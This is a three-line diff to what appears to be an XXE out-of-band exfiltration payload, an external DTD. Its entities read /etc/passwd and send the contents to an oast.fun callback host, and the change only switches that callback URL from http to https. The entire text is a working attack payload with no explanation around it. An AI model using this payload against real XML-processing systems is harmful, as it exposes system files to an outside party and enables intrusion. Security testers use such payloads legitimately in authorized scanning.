@@ -1,3 +1,3 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; callhome SYSTEM 'http://jbogwmzyhnnqmnbdpwqsu2sdb72du2hjq.oast.fun/?data=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; callhome SYSTEM 'https://jbogwmzyhnnqmnbdpwqsu2sdb72du2hjq.oast.fun/?data=%file;'>">
 %eval;
